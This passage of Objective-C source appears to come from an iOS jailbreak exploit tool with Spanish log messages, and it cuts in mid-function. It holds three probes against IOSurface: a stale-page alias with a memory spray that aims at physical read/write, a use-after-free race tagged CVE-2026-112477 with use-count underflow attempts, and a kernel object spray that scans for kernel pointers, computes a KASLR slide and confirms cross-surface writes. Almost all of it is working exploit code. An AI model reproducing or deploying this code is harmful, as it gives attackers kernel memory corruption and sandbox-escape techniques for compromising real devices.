                    @"IOSurfacePixelFormat": @(0x42475241),
                    @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
                };
                pgmSprays[i] = createSurf((__bridge CFDictionaryRef)pp);
                if (pgmSprays[i]) {
                    if (lockS) { uint32_t s = 0; lockS(pgmSprays[i], 3, &s); }
                    void *sb = getBase(pgmSprays[i]);
                    if (sb) memcpy(sb, &pgmMarker, sizeof(pgmMarker));
                    if (unlockS) { uint32_t s = 0; unlockS(pgmSprays[i], 3, &s); }
                    pgmCount++;
                } else {
                    break;
                }
            }
            log([NSString stringWithFormat:@"JB3: PurpleGfxMem spray: %d/30", pgmCount]);

            uint32_t staleRead3 = 0;
            memcpy(&staleRead3, (void*)alias, sizeof(staleRead3));
            log([NSString stringWithFormat:@"JB3: Post-PGM-spray alias lee: 0x%08X", staleRead3]);

            if (staleRead3 == pgmMarker) {
                log(@"JB3: *** PurpleGfxMem RECLAMÓ LAS PÁGINAS ***");
                log(@"JB3: *** ALIAS STALE VE DATOS DEL SPRAY PGM ***");
                log(@"JB3: *** ESTO ES UNA PRIMITIVA DE R/W FÍSICA ***");

                uint32_t poison = 0x42424242;
                memcpy((void*)alias, &poison, sizeof(poison));

                for (int i = 0; i < pgmCount; i++) {
                    if (!pgmSprays[i]) continue;
                    if (lockS) { uint32_t s = 0; lockS(pgmSprays[i], 3, &s); }
                    void *sb = getBase(pgmSprays[i]);
                    if (sb) {
                        uint32_t v = 0;
                        memcpy(&v, sb, sizeof(v));
                        if (v == poison) {
                            uint32_t sid = getID ? getID(pgmSprays[i]) : 0;
                            log([NSString stringWithFormat:
                                @"JB3: *** ESCRITURA CROSS-SURFACE CONFIRMADA PGM[%d] ID=%u ***", i, sid]);
                        }
                    }
                    if (unlockS) { uint32_t s = 0; unlockS(pgmSprays[i], 3, &s); }
                }
            }

            for (int i = 0; i < pgmCount; i++) {
                if (pgmSprays[i]) CFRelease(pgmSprays[i]);
            }
        }

        vm_deallocate(mach_task_self(), alias, (vm_size_t)entrySize);
        mach_port_deallocate(mach_task_self(), entryPort);

        log(@"JB3: ========================================");
        log(@"JB3: Stale-Page Alias Probe completado.");
        log(@"JB3: ========================================");

        dlclose(h);
        done(@{@"phase3": @"complete"});
    });
}

#pragma mark - Probe JB4: IOSurface Notify UAF Race (CVE-2026-112477)

void iosurface_notify_uaf_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        log(@"JB4: ========================================");
        log(@"JB4: IOSurface Notify UAF Race (CVE-2026-112477)");
        log(@"JB4: ========================================");

        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
        if (!h) { log(@"JB4: No se pudo abrir IOSurface.framework"); done(@{@"error": @"dlopen"}); return; }

        typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
        typedef uint32_t (*GetIDFn)(IOSurfaceRef);
        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
        typedef void* (*GetBaseFn)(IOSurfaceRef);
        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
        typedef void (*IncUseFn)(IOSurfaceRef);
        IncUseFn incUse = (IncUseFn)dlsym(h, "IOSurfaceIncrementUseCount");
        typedef void (*DecUseFn)(IOSurfaceRef);
        DecUseFn decUse = (DecUseFn)dlsym(h, "IOSurfaceDecrementUseCount");
        typedef int32_t (*GetUseFn)(IOSurfaceRef);
        GetUseFn getUse = (GetUseFn)dlsym(h, "IOSurfaceGetUseCount");
        typedef IOSurfaceRef (*LookupFn)(uint32_t);
        LookupFn lookup = (LookupFn)dlsym(h, "IOSurfaceLookup");

        typedef kern_return_t (*SetNotifyFn)(mach_port_t, uint64_t, uint64_t);
        SetNotifyFn setNotify = (SetNotifyFn)dlsym(h, "IOSurfaceClientSetSurfaceNotify");
        typedef kern_return_t (*RemoveNotifyFn)(uint64_t);
        RemoveNotifyFn removeNotify = (RemoveNotifyFn)dlsym(h, "IOSurfaceClientRemoveSurfaceNotify");

        log([NSString stringWithFormat:@"JB4: Funciones: create=%d id=%d base=%d lock=%d inc=%d dec=%d use=%d lookup=%d",
             createSurf!=NULL, getID!=NULL, getBase!=NULL, lockS!=NULL,
             incUse!=NULL, decUse!=NULL, getUse!=NULL, lookup!=NULL]);
        log([NSString stringWithFormat:@"JB4: Notify: setNotify=%d removeNotify=%d",
             setNotify!=NULL, removeNotify!=NULL]);

        if (!createSurf) {
            log(@"JB4: IOSurfaceCreate no disponible");
            dlclose(h);
            done(@{@"error": @"no_create"});
            return;
        }

        log(@"JB4: --- Paso 1: Probar UseCount como trigger de notificaciones ---");
        NSDictionary *props = @{
            @"IOSurfaceWidth": @32,
            @"IOSurfaceHeight": @32,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @(0x42475241),
        };

        IOSurfaceRef testSurf = createSurf((__bridge CFDictionaryRef)props);
        if (testSurf && incUse && decUse && getUse) {
            uint32_t testID = getID ? getID(testSurf) : 0;
            log([NSString stringWithFormat:@"JB4: Superficie test ID=%u", testID]);

            int32_t uc0 = getUse(testSurf);
            for (int i = 0; i < 100; i++) incUse(testSurf);
            int32_t uc100 = getUse(testSurf);
            for (int i = 0; i < 100; i++) decUse(testSurf);
            int32_t ucEnd = getUse(testSurf);
            log([NSString stringWithFormat:@"JB4: UseCount: inicio=%d +100=%d -100=%d", uc0, uc100, ucEnd]);

            for (int i = 0; i < 200; i++) decUse(testSurf);
            int32_t ucDeep = getUse(testSurf);
            log([NSString stringWithFormat:@"JB4: UseCount deep underflow: %d", ucDeep]);
            if (ucDeep < 0) {
                log(@"JB4: *** USECOUNT NEGATIVO ALCANZADO ***");
            } else {
                log(@"JB4: UseCount clampea en 0 (no permite negativo simple)");
            }
            for (int i = 0; i < 200; i++) incUse(testSurf);
            for (int i = 0; i < 200; i++) decUse(testSurf);

            CFRelease(testSurf);
        }

        if (!isr_stopped() && setNotify) {
            log(@"JB4: --- Paso 2: SetSurfaceNotify disponible — probar registro ---");

            IOSurfaceRef notifySurf = createSurf((__bridge CFDictionaryRef)props);
            if (notifySurf) {
                uint32_t nID = getID ? getID(notifySurf) : 0;
                log([NSString stringWithFormat:@"JB4: Superficie para notify ID=%u", nID]);

                mach_port_t notifyPort = MACH_PORT_NULL;
                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notifyPort);
                mach_port_insert_right(mach_task_self(), notifyPort, notifyPort, MACH_MSG_TYPE_MAKE_SEND);

                kern_return_t nkr = setNotify(notifyPort, (uint64_t)nID, 0);
                log([NSString stringWithFormat:@"JB4: SetSurfaceNotify kr=%d port=%u surfID=%u", nkr, notifyPort, nID]);

                if (nkr == KERN_SUCCESS) {
                    log(@"JB4: *** NOTIFY REGISTRADO — ventana UAF existe ***");

                    if (incUse) {
                        incUse(notifySurf);
                        log(@"JB4: IncrementUseCount llamado (trigger de dispatchNotify)");
                    }

                    if (removeNotify) {
                        kern_return_t rkr = removeNotify((uint64_t)nID);
                        log([NSString stringWithFormat:@"JB4: RemoveSurfaceNotify kr=%d", rkr]);
                    }
                } else {
                    log(@"JB4: SetSurfaceNotify no disponible o rechazado en iOS 27.0");
                }

                if (notifyPort != MACH_PORT_NULL) {
                    mach_port_mod_refs(mach_task_self(), notifyPort, MACH_PORT_RIGHT_RECEIVE, -1);
                }
                CFRelease(notifySurf);
            }
        } else if (!setNotify) {
            log(@"JB4: SetSurfaceNotify no encontrado — probando UseCount race sin notify");
        }

        if (!isr_stopped()) {
            log(@"JB4: --- Paso 3: Race Create/Release + Lookup ---");
            __block atomic_int raceHits = 0;
            __block atomic_int raceMiss = 0;
            __block atomic_int raceUAF = 0;
            volatile uint32_t *sharedIDs = (volatile uint32_t *)calloc(64, sizeof(uint32_t));
            __block atomic_int idIdx = 0;

            dispatch_group_t group = dispatch_group_create();
            dispatch_queue_t q1 = dispatch_queue_create("jb4.creator", DISPATCH_QUEUE_SERIAL);
            dispatch_queue_t q2 = dispatch_queue_create("jb4.looker", DISPATCH_QUEUE_SERIAL);

            dispatch_group_async(group, q1, ^{
                for (int i = 0; i < 500 && !isr_stopped(); i++) {
                    @autoreleasepool {
                        IOSurfaceRef s = createSurf((__bridge CFDictionaryRef)props);
                        if (s) {
                            uint32_t sid = getID ? getID(s) : 0;
                            int idx = atomic_fetch_add(&idIdx, 1);
                            sharedIDs[idx % 64] = sid;
                            usleep(50);
                            CFRelease(s);
                        }
                    }
                }
            });

            dispatch_group_async(group, q2, ^{
                for (int i = 0; i < 2000 && !isr_stopped(); i++) {
                    @autoreleasepool {
                        int curIdx = atomic_load(&idIdx);
                        if (curIdx <= 0) { usleep(10); continue; }
                        uint32_t sid = sharedIDs[(curIdx - 1) % 64];
                        if (sid == 0) continue;

                        IOSurfaceRef looked = lookup ? lookup(sid) : NULL;
                        if (looked) {
                            atomic_fetch_add(&raceHits, 1);
                            void *b = getBase ? getBase(looked) : NULL;
                            if (b) {
                                uint32_t val = 0;
                                memcpy(&val, b, sizeof(val));
                                if (val == 0xDEADDEAD || val == 0xFEEDFACE) {
                                    atomic_fetch_add(&raceUAF, 1);
                                }
                            }
                            CFRelease(looked);
                        } else {
                            atomic_fetch_add(&raceMiss, 1);
                        }
                    }
                }
            });

            dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
            free((void*)sharedIDs);
            log([NSString stringWithFormat:@"JB4: Race result: hits=%d miss=%d uaf_patterns=%d",
                 atomic_load(&raceHits), atomic_load(&raceMiss), atomic_load(&raceUAF)]);
            if (atomic_load(&raceMiss) > 0) {
                log([NSString stringWithFormat:@"JB4: *** %d LOOKUP FALLIDOS — superficie ya liberada ***", atomic_load(&raceMiss)]);
                log(@"JB4: Ventana de race confirmada entre Create/Release y Lookup");
            }
        }

        log(@"JB4: ========================================");
        log(@"JB4: Notify UAF Race Probe completado.");
        log(@"JB4: ========================================");

        dlclose(h);
        done(@{@"phase4": @"complete"});
    });
}

#pragma mark - Probe JB5: Kernel Object Spray via Stale Alias

void iosurface_kernel_spray_alias(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        log(@"JB5: ========================================");
        log(@"JB5: Kernel Object Spray via Stale-Page Alias");
        log(@"JB5: ========================================");

        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
        if (!h) { log(@"JB5: No se pudo abrir IOSurface.framework"); done(@{@"error": @"dlopen"}); return; }

        typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
        typedef uint32_t (*GetIDFn)(IOSurfaceRef);
        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
        typedef void* (*GetBaseFn)(IOSurfaceRef);
        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
        typedef size_t (*GetAllocSzFn)(IOSurfaceRef);
        GetAllocSzFn getAllocSz = (GetAllocSzFn)dlsym(h, "IOSurfaceGetAllocSize");
        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
        SetValueFn setValue = (SetValueFn)dlsym(h, "IOSurfaceSetValue");
        typedef CFDictionaryRef (*CopyAllFn)(IOSurfaceRef);
        CopyAllFn copyAll = (CopyAllFn)dlsym(h, "IOSurfaceCopyAllValues");

        typedef kern_return_t (*MakeEntryFn)(vm_map_t, memory_object_size_t *,
            memory_object_offset_t, vm_prot_t, mach_port_t *, mem_entry_name_port_t);
        MakeEntryFn makeEntry = (MakeEntryFn)dlsym(RTLD_DEFAULT, "mach_make_memory_entry_64");

        if (!createSurf || !getBase || !makeEntry || !setValue) {
            log([NSString stringWithFormat:@"JB5: Funciones: create=%d base=%d makeEntry=%d setValue=%d",
                 createSurf!=NULL, getBase!=NULL, makeEntry!=NULL, setValue!=NULL]);
            dlclose(h); done(@{@"error": @"dlsym"}); return;
        }
        log(@"JB5: Todas las funciones cargadas OK");

        uint32_t kernTextPtrs = 0;
        uint32_t kernHeapPtrs = 0;
        uint32_t crossSurfaceWrites = 0;
        int aliasOK = 0;

        mach_port_t entryPort = MACH_PORT_NULL;
        memory_object_size_t entrySize = 0;
        vm_address_t alias = 0;
        int sprayCount = 0;
        IOSurfaceRef *sprays = (IOSurfaceRef *)calloc(50, sizeof(IOSurfaceRef));
        if (!sprays) { log(@"JB5: calloc falló"); dlclose(h); done(@{@"error": @"calloc"}); return; }

        log(@"JB5: --- Paso 1: Crear superficie PurpleGfxMem ---");
        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @(0x42475241),
            @"IOSurfaceAllocSize": @(0x4000),
            @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
        };
        IOSurfaceRef surf = createSurf((__bridge CFDictionaryRef)props);
        if (!surf) {
            log(@"JB5: PurpleGfxMem falló — probando fallback");
            NSDictionary *fb = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceAllocSize": @(0x4000),
            };
            surf = createSurf((__bridge CFDictionaryRef)fb);
        }
        if (!surf) {
            log(@"JB5: IOSurfaceCreate falló"); free(sprays); dlclose(h);
            done(@{@"error": @"create_fail"}); return;
        }

        uint32_t surfID = getID ? getID(surf) : 0;
        size_t allocSz = getAllocSz ? getAllocSz(surf) : 0;
        log([NSString stringWithFormat:@"JB5: Superficie creada ID=%u AllocSize=0x%zx", surfID, allocSz]);

        log(@"JB5: --- Paso 2: Lock + escribir marcador ---");
        if (lockS) { uint32_t s = 0; lockS(surf, 3, &s); }
        void *base = getBase(surf);
        if (!base || allocSz == 0) {
            log(@"JB5: BaseAddress NULL"); if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
            CFRelease(surf); free(sprays); dlclose(h);
            done(@{@"error": @"no_base"}); return;
        }
        uint32_t marker = 0xDEAD5555;
        memset(base, 0, allocSz < 0x4000 ? allocSz : 0x4000);
        memcpy(base, &marker, sizeof(marker));
        log([NSString stringWithFormat:@"JB5: Base=%p marcador=0x%08X escrito", base, marker]);
        if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }

        log(@"JB5: --- Paso 3: mach_make_memory_entry_64 ---");
        if (!isr_stopped()) {
            entrySize = (memory_object_size_t)allocSz;
            kern_return_t mkr = makeEntry(mach_task_self(), &entrySize,
                (memory_object_offset_t)(uintptr_t)base,
                VM_PROT_READ | VM_PROT_WRITE, &entryPort, MACH_PORT_NULL);
            log([NSString stringWithFormat:@"JB5: memory_entry kr=%d port=%u size=%llu",
                 mkr, entryPort, (uint64_t)entrySize]);
            if (mkr != KERN_SUCCESS || entryPort == MACH_PORT_NULL) {
                log(@"JB5: memory entry falló");
                CFRelease(surf); free(sprays); dlclose(h);
                done(@{@"error": @"entry_fail"}); return;
            }
        }

        log(@"JB5: --- Paso 4: vm_map alias + verificar ---");
        if (!isr_stopped()) {
            kern_return_t vmkr = vm_map(mach_task_self(), &alias, (vm_size_t)entrySize,
                0, VM_FLAGS_ANYWHERE, entryPort, 0, FALSE,
                VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
                VM_INHERIT_NONE);
            log([NSString stringWithFormat:@"JB5: vm_map kr=%d alias=%p", vmkr, (void*)alias]);
            if (vmkr != KERN_SUCCESS) {
                log(@"JB5: vm_map falló");
                mach_port_deallocate(mach_task_self(), entryPort);
                CFRelease(surf); free(sprays); dlclose(h);
                done(@{@"error": @"vm_map_fail"}); return;
            }
            uint32_t aliasRead = 0;
            memcpy(&aliasRead, (void*)alias, sizeof(aliasRead));
            aliasOK = (aliasRead == marker);
            log([NSString stringWithFormat:@"JB5: Alias lee 0x%08X match=%s", aliasRead, aliasOK ? "SI" : "NO"]);
        }

        log(@"JB5: --- Paso 5: CFRelease superficie (alias sobrevive) ---");
        CFRelease(surf);
        surf = NULL;

        if (!isr_stopped()) {
            uint32_t staleCheck = 0;
            memcpy(&staleCheck, (void*)alias, sizeof(staleCheck));
            log([NSString stringWithFormat:@"JB5: Post-release alias=0x%08X stale=%s",
                 staleCheck, (staleCheck == marker) ? "SI" : "NO"]);
        }

        log(@"JB5: --- Paso 6: Spray 50 PurpleGfxMem con propiedades grandes ---");
        if (!isr_stopped()) {
            for (int i = 0; i < 50 && !isr_stopped(); i++) {
                NSDictionary *sp = @{
                    @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                    @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241),
                    @"IOSurfaceAllocSize": @(0x4000),
                    @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
                };
                sprays[i] = createSurf((__bridge CFDictionaryRef)sp);
                if (!sprays[i]) break;
                sprayCount++;

                if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
                void *sb = getBase(sprays[i]);
                if (sb) {
                    uint32_t sprayMark = 0xBB000000 | (uint32_t)i;
                    memcpy(sb, &sprayMark, sizeof(sprayMark));
                }
                if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }

                uint8_t *propBuf = (uint8_t *)calloc(1, 4096);
                if (propBuf) {
                    uint64_t fakeKernPtrs[8] = {
                        0xfffffff007004000ULL + (uint64_t)i * 0x1000,
                        0xfffffff007100000ULL + (uint64_t)i * 0x100,
                        0xffffffe000000000ULL + (uint64_t)i * 0x10000,
                        0xfffffff00710a000ULL,
                        0xfffffff007200000ULL,
                        0xffffffe0a0000000ULL + (uint64_t)(i * 0x4000),
                        0xfffffff007004000ULL,
                        0xDEADFACE00000000ULL | (uint64_t)i,
                    };
                    memcpy(propBuf, fakeKernPtrs, sizeof(fakeKernPtrs));
                    for (int j = 64; j < 4096; j += 8) {
                        uint64_t fill = 0xAAAA000000000000ULL | (uint64_t)((i << 16) | j);
                        memcpy(propBuf + j, &fill, 8);
                    }
                    NSData *propData = [NSData dataWithBytes:propBuf length:4096];
                    NSString *key = [NSString stringWithFormat:@"JB5_spray_%d", i];
                    setValue(sprays[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)propData);

                    setValue(sprays[i], (__bridge CFStringRef)[NSString stringWithFormat:@"JB5_num_%d", i],
                             (__bridge CFTypeRef)@(0xDEADBEEF00000000ULL | (uint64_t)i));
                    setValue(sprays[i], (__bridge CFStringRef)[NSString stringWithFormat:@"JB5_str_%d", i],
                             CFSTR("KERNEL_SPRAY_MARKER"));
                    free(propBuf);
                }
            }
            log([NSString stringWithFormat:@"JB5: Spray: %d/50 superficies con propiedades", sprayCount]);
        }

        log(@"JB5: --- Paso 7: Escaneo del alias stale buscando punteros kernel ---");
        if (!isr_stopped() && alias != 0) {
            size_t scanSize = entrySize < 0x4000 ? (size_t)entrySize : 0x4000;
            uint32_t interesting = 0;
            uint32_t sprayPatterns = 0;

            for (size_t off = 0; off + 8 <= scanSize && !isr_stopped(); off += 8) {
                uint64_t val = 0;
                memcpy(&val, (void*)(alias + off), sizeof(val));

                if (val == 0) continue;

                if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                    kernTextPtrs++;
                    if (kernTextPtrs <= 20) {
                        log([NSString stringWithFormat:@"JB5: *** KERNEL TEXT PTR @offset=0x%zx: 0x%016llx ***",
                             off, (unsigned long long)val]);
                    }
                }
                else if ((val & 0xFFFFFFE000000000ULL) == 0xFFFFFFE000000000ULL) {
                    kernHeapPtrs++;
                    if (kernHeapPtrs <= 20) {
                        log([NSString stringWithFormat:@"JB5: *** KERNEL HEAP PTR @offset=0x%zx: 0x%016llx ***",
                             off, (unsigned long long)val]);
                    }
                }
                else if ((val & 0xFFFF000000000000ULL) == 0xAAAA000000000000ULL) {
                    sprayPatterns++;
                }
                else if (val != 0 && val != 0xFFFFFFFFFFFFFFFFULL) {
                    interesting++;
                    if (interesting <= 10) {
                        log([NSString stringWithFormat:@"JB5: Dato interesante @0x%zx: 0x%016llx",
                             off, (unsigned long long)val]);
                    }
                }
            }

            log([NSString stringWithFormat:@"JB5: Escaneo %zu bytes: kernText=%u kernHeap=%u spray=%u otros=%u",
                 scanSize, kernTextPtrs, kernHeapPtrs, sprayPatterns, interesting]);

            if (kernTextPtrs > 0) {
                uint64_t firstKPtr = 0;
                for (size_t off = 0; off + 8 <= scanSize; off += 8) {
                    uint64_t val = 0;
                    memcpy(&val, (void*)(alias + off), sizeof(val));
                    if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                        firstKPtr = val;
                        break;
                    }
                }
                uint64_t unslidBase = 0xfffffff007004000ULL;
                uint64_t slide = firstKPtr - unslidBase;
                log([NSString stringWithFormat:@"JB5: *** POSIBLE KASLR SLIDE: 0x%llx (basado en ptr 0x%llx) ***",
                     (unsigned long long)slide, (unsigned long long)firstKPtr]);
            }
        }

        log(@"JB5: --- Paso 8: Escritura cross-surface via alias ---");
        if (!isr_stopped() && alias != 0) {
            uint32_t poison = 0x41414141;
            memcpy((void*)alias, &poison, sizeof(poison));

            for (int i = 0; i < sprayCount && !isr_stopped(); i++) {
                if (!sprays[i]) continue;
                if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
                void *sb = getBase(sprays[i]);
                if (sb) {
                    uint32_t v = 0;
                    memcpy(&v, sb, sizeof(v));
                    if (v == poison) {
                        uint32_t sid = getID ? getID(sprays[i]) : 0;
                        crossSurfaceWrites++;
                        log([NSString stringWithFormat:
                            @"JB5: *** ESCRITURA CROSS-SURFACE spray[%d] ID=%u ***", i, sid]);
                    }
                }
                if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
            }
            log([NSString stringWithFormat:@"JB5: Cross-surface writes confirmados: %u", crossSurfaceWrites]);
        }

        log(@"JB5: --- Paso 9: Task info para direcciones kernel ---");
        if (!isr_stopped()) {
            task_dyld_info_data_t di;
            mach_msg_type_number_t dc = TASK_DYLD_INFO_COUNT;
            if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&di, &dc) == KERN_SUCCESS) {
                log([NSString stringWithFormat:@"JB5: DYLD all_image_info=0x%llx size=%llu",
                     di.all_image_info_addr, di.all_image_info_size]);
            }
            struct task_vm_info vi;
            mach_msg_type_number_t vc = TASK_VM_INFO_COUNT;
            if (task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&vi, &vc) == KERN_SUCCESS) {
                log([NSString stringWithFormat:@"JB5: VM vsize=0x%llx rsize=0x%llx pgsz=%d",
                     vi.virtual_size, vi.resident_size, vi.page_size]);
            }
        }

        for (int i = 0; i < sprayCount; i++) {
            if (sprays[i]) CFRelease(sprays[i]);
        }
        free(sprays);
        if (alias != 0) vm_deallocate(mach_task_self(), alias, (vm_size_t)entrySize);
        if (entryPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), entryPort);

        log(@"JB5: ========================================");
        log([NSString stringWithFormat:@"JB5: Resultado: kernText=%u kernHeap=%u crossWrite=%u alias=%s",
             kernTextPtrs, kernHeapPtrs, crossSurfaceWrites, aliasOK ? "OK" : "FAIL"]);
        log(@"JB5: ========================================");

        dlclose(h);
        done(@{
            @"kernTextPtrs": @(kernTextPtrs),
            @"kernHeapPtrs": @(kernHeapPtrs),
            @"crossSurfaceWrites": @(crossSurfaceWrites),
            @"aliasOK": @(aliasOK),
        });
    });
}

